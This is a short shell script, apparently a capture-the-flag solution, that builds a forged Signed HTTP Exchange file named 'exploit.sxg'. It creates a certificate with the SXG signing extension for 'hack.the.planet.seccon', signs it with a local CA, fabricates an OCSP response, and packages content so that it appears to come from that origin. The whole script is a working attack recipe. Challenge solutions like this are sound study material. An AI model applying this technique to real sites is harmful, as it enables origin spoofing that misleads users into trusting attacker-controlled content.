#!/bin/sh

IP="10.200.200.2"

rm -rf exp_cert.key exp_cert.cnf exp_cert.csr exp_cert.pem exp_cert.cbor exp_cert.ocsp index.txt exploit.sxg

echo "[req]\nprompt = no\ndistinguished_name = dn\nreq_extensions = v3_req\n\n[dn]\nCN = hack.the.planet.seccon\n\n[v3_req]\nbasicConstraints = CA:FALSE\nkeyUsage = digitalSignature\nsubjectAltName = DNS:hack.the.planet.seccon,IP:${IP}\n1.3.6.1.4.1.11129.2.1.22 = ASN1:NULL" > exp_cert.cnf

openssl ecparam -name prime256v1 -genkey -out exp_cert.key

openssl req -new -key exp_cert.key -out exp_cert.csr -config exp_cert.cnf

openssl x509 -req -days 90 -in exp_cert.csr \
    -CA cert.crt -CAkey cert.key -CAcreateserial \
    -out exp_cert.crt \
    -extensions v3_req -extfile exp_cert.cnf -sha256

SERIAL=$(openssl x509 -in exp_cert.crt -serial -noout | cut -d= -f2)
printf "V\t301231235959Z\t\t%s\tunknown\t/CN=hack.the.planet.seccon\n" "${SERIAL}" > index.txt

openssl ocsp -issuer cert.crt -cert exp_cert.crt -reqout exp_cert.req

openssl ocsp -index index.txt \
    -rsigner cert.crt -rkey cert.key \
    -CA cert.crt \
    -reqin exp_cert.req \
    -respout exp_cert.ocsp \
    -ndays 7 \
    -noverify

cat exp_cert.crt cert.crt > exp_cert.pem

gen-certurl -pem exp_cert.pem -ocsp exp_cert.ocsp > exp_cert.cbor

gen-signedexchange \
  -uri https://hack.the.planet.seccon/ \
  -content index.html \
  -certificate exp_cert.crt \
  -privateKey exp_cert.key \
  -certUrl https://$IP/exp_cert.cbor \
  -validityUrl https://hack.the.planet.seccon/resource.validity.msg  \
  -o exploit.sxg